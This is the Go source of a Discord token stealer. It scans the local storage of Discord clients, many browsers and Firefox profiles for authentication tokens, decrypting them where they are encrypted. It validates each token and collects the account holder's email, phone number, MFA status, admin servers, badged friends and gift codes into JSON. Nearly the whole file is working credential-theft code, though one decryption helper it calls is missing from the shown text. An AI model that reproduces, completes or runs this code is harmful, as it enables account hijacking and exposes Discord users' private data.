package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

const (
	tokenRegex     = `[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}`
	encryptedRegex = `dQw4w9WgXcQ:[^"]*`
)

type DiscordUser struct {
	Username      string `json:"username"`
	Discriminator string `json:"discriminator"`
	ID            string `json:"id"`
	Email         string `json:"email"`
	Phone         string `json:"phone"`
	MFAAEnabled   bool   `json:"mfa_enabled"`
	Avatar        string `json:"avatar"`
	PremiumType   int    `json:"premium_type"`
	PublicFlags   int    `json:"public_flags"`
}

type ExtractTokens struct {
	baseURL     string
	appData     string
	roaming     string
	tokens      []string
	uids        []string
	tokenRe     *regexp.Regexp
	encryptedRe *regexp.Regexp
}

func NewExtractTokens() *ExtractTokens {
	return &ExtractTokens{
		baseURL:     "https://discord.com/api/v9/users/@me",
		appData:     os.Getenv("LOCALAPPDATA"),
		roaming:     os.Getenv("APPDATA"),
		tokenRe:     regexp.MustCompile(tokenRegex),
		encryptedRe: regexp.MustCompile(encryptedRegex),
	}
}

func (et *ExtractTokens) Extract() {
	paths := map[string]string{
		"Discord":              filepath.Join(et.roaming, "discord", "Local Storage", "leveldb"),
		"Discord Canary":       filepath.Join(et.roaming, "discordcanary", "Local Storage", "leveldb"),
		"Lightcord":            filepath.Join(et.roaming, "Lightcord", "Local Storage", "leveldb"),
		"Discord PTB":          filepath.Join(et.roaming, "discordptb", "Local Storage", "leveldb"),
		"Opera":                filepath.Join(et.roaming, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
		"Opera GX":             filepath.Join(et.roaming, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
		"Amigo":                filepath.Join(et.appData, "Amigo", "User Data", "Local Storage", "leveldb"),
		"Torch":                filepath.Join(et.appData, "Torch", "User Data", "Local Storage", "leveldb"),
		"Kometa":               filepath.Join(et.appData, "Kometa", "User Data", "Local Storage", "leveldb"),
		"Orbitum":              filepath.Join(et.appData, "Orbitum", "User Data", "Local Storage", "leveldb"),
		"CentBrowser":          filepath.Join(et.appData, "CentBrowser", "User Data", "Local Storage", "leveldb"),
		"7Star":                filepath.Join(et.appData, "7Star", "7Star", "User Data", "Local Storage", "leveldb"),
		"Sputnik":              filepath.Join(et.appData, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),
		"Vivaldi":              filepath.Join(et.appData, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),
		"Chrome SxS":           filepath.Join(et.appData, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb"),
		"Chrome":               filepath.Join(et.appData, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
		"Chrome1":              filepath.Join(et.appData, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),
		"Chrome2":              filepath.Join(et.appData, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),
		"Chrome3":              filepath.Join(et.appData, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),
		"Chrome4":              filepath.Join(et.appData, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),
		"Chrome5":              filepath.Join(et.appData, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),
		"Epic Privacy Browser": filepath.Join(et.appData, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),
		"Microsoft Edge":       filepath.Join(et.appData, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
		"Uran":                 filepath.Join(et.appData, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),
		"Yandex":               filepath.Join(et.appData, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),
		"Brave":                filepath.Join(et.appData, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
		"Iridium":              filepath.Join(et.appData, "Iridium", "User Data", "Default", "Local Storage", "leveldb"),
	}

	for name, path := range paths {
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		if strings.Contains(strings.ToLower(name), "cord") {
			discordName := strings.ToLower(strings.ReplaceAll(name, " ", ""))
			localStatePath := filepath.Join(et.roaming, discordName, "Local State")
			if _, err := os.Stat(localStatePath); os.IsNotExist(err) {
				continue
			}
			masterKey, err := et.getMasterKey(localStatePath)
			if err != nil {
				continue
			}
			et.processEncryptedFiles(path, masterKey)
		} else {
			et.processPlaintextFiles(path)
		}
	}
	et.processFirefoxProfiles()
}

func (et *ExtractTokens) processEncryptedFiles(path string, masterKey []byte) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		return
	}
	for _, file := range files {
		filename := file.Name()
		if !strings.HasSuffix(filename, ".log") && !strings.HasSuffix(filename, ".ldb") {
			continue
		}
		content, err := ioutil.ReadFile(filepath.Join(path, filename))
		if err != nil {
			continue
		}
		scanner := bufio.NewScanner(bytes.NewReader(content))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			matches := et.encryptedRe.FindAllString(line, -1)
			for _, match := range matches {
				parts := strings.Split(match, "dQw4w9WgXcQ:")
				if len(parts) < 2 {
					continue
				}
				decoded, err := base64.StdEncoding.DecodeString(parts[1])
				if err != nil {
					continue
				}
				token, err := et.decryptVal(decoded, masterKey)
				if err == nil && et.validateToken(token) {
					et.addToken(token)
				}
			}
		}
	}
}

func (et *ExtractTokens) processPlaintextFiles(path string) {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		return
	}
	for _, file := range files {
		filename := file.Name()
		if !strings.HasSuffix(filename, ".log") && !strings.HasSuffix(filename, ".ldb") {
			continue
		}
		content, err := ioutil.ReadFile(filepath.Join(path, filename))
		if err != nil {
			continue
		}
		scanner := bufio.NewScanner(bytes.NewReader(content))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			matches := et.tokenRe.FindAllString(line, -1)
			for _, token := range matches {
				if et.validateToken(token) {
					et.addToken(token)
				}
			}
		}
	}
}

func (et *ExtractTokens) processFirefoxProfiles() {
	firefoxPath := filepath.Join(et.roaming, "Mozilla", "Firefox", "Profiles")
	if _, err := os.Stat(firefoxPath); os.IsNotExist(err) {
		return
	}
	filepath.Walk(firefoxPath, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || !strings.HasSuffix(path, ".sqlite") {
			return nil
		}
		content, err := ioutil.ReadFile(path)
		if err != nil {
			return nil
		}
		scanner := bufio.NewScanner(bytes.NewReader(content))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			matches := et.tokenRe.FindAllString(line, -1)
			for _, token := range matches {
				if et.validateToken(token) {
					et.addToken(token)
				}
			}
		}
		return nil
	})
}

func (et *ExtractTokens) addToken(token string) {
	uid, err := et.getUserID(token)
	if err == nil && !contains(et.uids, uid) {
		et.tokens = append(et.tokens, token)
		et.uids = append(et.uids, uid)
	}
}

func (et *ExtractTokens) getMasterKey(path string) ([]byte, error) {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var localState struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, err
	}
	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if len(encryptedKey) < 5 || string(encryptedKey[:5]) != "DPAPI" {
		return nil, fmt.Errorf("invalid encrypted key format")
	}
	encryptedKey = encryptedKey[5:]
	decryptedKey, err := decryptWithDPAPI(encryptedKey)
	if err != nil {
		return nil, err
	}
	return decryptedKey, nil
}

func (et *ExtractTokens) validateToken(token string) bool {
	req, _ := http.NewRequest("GET", et.baseURL, nil)
	req.Header.Set("Authorization", token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}

func (et *ExtractTokens) getUserID(token string) (string, error) {
	req, _ := http.NewRequest("GET", et.baseURL, nil)
	req.Header.Set("Authorization", token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	var user struct {
		ID string `json:"id"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&user); err != nil {
		return "", err
	}
	return user.ID, nil
}

func (et *ExtractTokens) decryptVal(buff []byte, masterKey []byte) (string, error) {
	if len(buff) < 15 {
		return "", fmt.Errorf("invalid buffer length")
	}
	iv := buff[3:15]
	payload := buff[15:]
	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	decrypted, err := gcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}
	return string(decrypted), nil
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

type FetchTokens struct {
	tokens []string
}

func NewFetchTokens() *FetchTokens {
	extractor := NewExtractTokens()
	extractor.Extract()
	return &FetchTokens{tokens: extractor.tokens}
}

func (ft *FetchTokens) Upload(rawData bool) []string {
	var results []string
	for _, token := range ft.tokens {
		user, err := ft.getUserInfo(token)
		if err != nil {
			continue
		}
		hqGuilds := ft.getHQGuilds(token)
		hqFriends := ft.getHQFriends(token)
		giftCodes := ft.getGiftCodes(token)
		badges := strings.Join(calcFlags(user.PublicFlags), " ")
		data := map[string]interface{}{
			"username":   fmt.Sprintf("%s#%s", user.Username, user.Discriminator),
			"id":         user.ID,
			"email":      user.Email,
			"phone":      user.Phone,
			"mfa":        user.MFAAEnabled,
			"nitro":      getNitroType(user.PremiumType),
			"avatar":     getAvatarURL(user),
			"token":      token,
			"hq_guilds":  hqGuilds,
			"hq_friends": hqFriends,
			"gift_codes": giftCodes,
			"badges":     badges,
		}
		jsonData, _ := json.Marshal(data)
		results = append(results, string(jsonData))
	}
	return results
}

func (ft *FetchTokens) getUserInfo(token string) (*DiscordUser, error) {
	req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	req.Header.Set("Authorization", token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var user DiscordUser
	if err := json.NewDecoder(resp.Body).Decode(&user); err != nil {
		return nil, err
	}
	return &user, nil
}

func (ft *FetchTokens) getHQGuilds(token string) string {
	url := "https://discord.com/api/v9/users/@me/guilds?with_counts=true"
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	var guilds []struct {
		ID                       string `json:"id"`
		Name                     string `json:"name"`
		Owner                    bool   `json:"owner"`
		Permissions              string `json:"permissions"`
		ApproximateMemberCount   int    `json:"approximate_member_count"`
		ApproximatePresenceCount int    `json:"approximate_presence_count"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&guilds); err != nil {
		return ""
	}
	var lines []string
	totalLen := 0
	for _, guild := range guilds {
		permInt, err := strconv.ParseInt(guild.Permissions, 10, 64)
		if err != nil {
			continue
		}
		if (permInt&0x8) == 0 || guild.ApproximateMemberCount < 100 {
			continue
		}
		ownerStr := "❌"
		if guild.Owner {
			ownerStr = "✅"
		}
		inviteURL := fmt.Sprintf("https://discord.com/api/v8/guilds/%s/invites", guild.ID)
		inviteReq, _ := http.NewRequest("GET", inviteURL, nil)
		inviteReq.Header.Set("Authorization", token)
		inviteResp, err := http.DefaultClient.Do(inviteReq)
		inviteLink := ""
		if err == nil {
			var invites []struct {
				Code string `json:"code"`
			}
			json.NewDecoder(inviteResp.Body).Decode(&invites)
			inviteResp.Body.Close()
			if len(invites) > 0 {
				inviteLink = "https://discord.gg/" + invites[0].Code
			}
		}
		if inviteLink == "" {
			inviteLink = "https://youtu.be/dQw4w9WgXcQ"
		}
		line := fmt.Sprintf("\u200b\n**%s (%s)** \n Owner: `%s` | Members: ` ⚫ %d / 🟢 %d / 🔴 %d `\n[Join Server](%s)",
			guild.Name, guild.ID, ownerStr, guild.ApproximateMemberCount, guild.ApproximatePresenceCount, guild.ApproximateMemberCount-guild.ApproximatePresenceCount, inviteLink)
		if totalLen+len(line) >= 1024 {
			break
		}
		lines = append(lines, line)
		totalLen += len(line)
	}
	if len(lines) > 0 {
		return strings.Join(lines, "\n")
	}
	return ""
}

func (ft *FetchTokens) getHQFriends(token string) string {
	url := "https://discord.com/api/v8/users/@me/relationships"
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	var friends []struct {
		User struct {
			ID            string `json:"id"`
			Username      string `json:"username"`
			Discriminator string `json:"discriminator"`
			PublicFlags   int    `json:"public_flags"`
		} `json:"user"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&friends); err != nil {
		return ""
	}
	var lines []string
	totalLen := 0
	for _, friend := range friends {
		flags := calcFlags(friend.User.PublicFlags)
		if len(flags) == 0 {
			continue
		}
		hqBadges := strings.Join(flags, " ")
		data := fmt.Sprintf("%s - `%s#%s (%s)`", hqBadges, friend.User.Username, friend.User.Discriminator, friend.User.ID)
		if totalLen+len(data) >= 1024 {
			break
		}
		lines = append(lines, data)
		totalLen += len(data)
	}
	if len(lines) > 0 {
		return strings.Join(lines, "\n")
	}
	return ""
}

func (ft *FetchTokens) getGiftCodes(token string) string {
	url := "https://discord.com/api/v9/users/@me/outbound-promotions/codes"
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	var codes []struct {
		Code      string `json:"code"`
		Promotion struct {
			OutboundTitle string `json:"outbound_title"`
		} `json:"promotion"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&codes); err != nil {
		return ""
	}
	var parts []string
	totalLen := 0
	for _, code := range codes {
		line := fmt.Sprintf(":gift: `%s`\n:ticket: `%s`", code.Promotion.OutboundTitle, code.Code)
		if totalLen+len(line) >= 1024 {
			break
		}
		parts = append(parts, line)
		totalLen += len(line)
	}
	if len(parts) > 0 {
		return strings.Join(parts, "\n\n")
	}
	return ""
}

func calcFlags(flags int) []string {
	flagsDict := map[string]struct {
		emoji string
		shift int
	}{
		"DISCORD_EMPLOYEE":       {"<:staff:968704541946167357>", 0},
		"DISCORD_PARTNER":        {"<:partner:968704542021652560>", 1},
		"HYPESQUAD_EVENTS":       {"<:hypersquad_events:968704541774192693>", 2},
		"BUG_HUNTER_LEVEL_1":     {"<:bug_hunter_1:968704541677723648>", 3},
		"HOUSE_BRAVERY":          {"<:hypersquad_1:968704541501571133>", 6},
		"HOUSE_BRILLIANCE":       {"<:hypersquad_2:968704541883261018>", 7},
		"HOUSE_BALANCE":          {"<:hypersquad_3:968704541874860082>", 8},
		"EARLY_SUPPORTER":        {"<:early_supporter:968704542126510090>", 9},
		"BUG_HUNTER_LEVEL_2":     {"<:bug_hunter_2:968704541774217246>", 14},
		"VERIFIED_BOT_DEVELOPER": {"<:verified_dev:968704541702905886>", 17},
		"ACTIVE_DEVELOPER":       {"<:Active_Dev:1045024909690163210>", 22},
		"CERTIFIED_MODERATOR":    {"<:certified_moderator:988996447938674699>", 18},
		"SPAMMER":                {"⌨", 20},
	}
	var result []string
	for _, v := range flagsDict {
		if flags&(1<<v.shift) != 0 {
			result = append(result, v.emoji)
		}
	}
	return result
}

func getNitroType(premiumType int) string {
	switch premiumType {
	case 1:
		return "Nitro Classic"
	case 2:
		return "Nitro"
	case 3:
		return "Nitro Basic"
	default:
		return "None"
	}
}

func getAvatarURL(user *DiscordUser) string {
	if user.Avatar == "" {
		return ""
	}
	url := fmt.Sprintf("https://cdn.discordapp.com/avatars/%s/%s.png", user.ID, user.Avatar)
	resp, err := http.Head(strings.Replace(url, ".png", ".gif", 1))
	if err == nil && resp.StatusCode == http.StatusOK {
		return strings.Replace(url, ".png", ".gif", 1)
	}
	return url
}
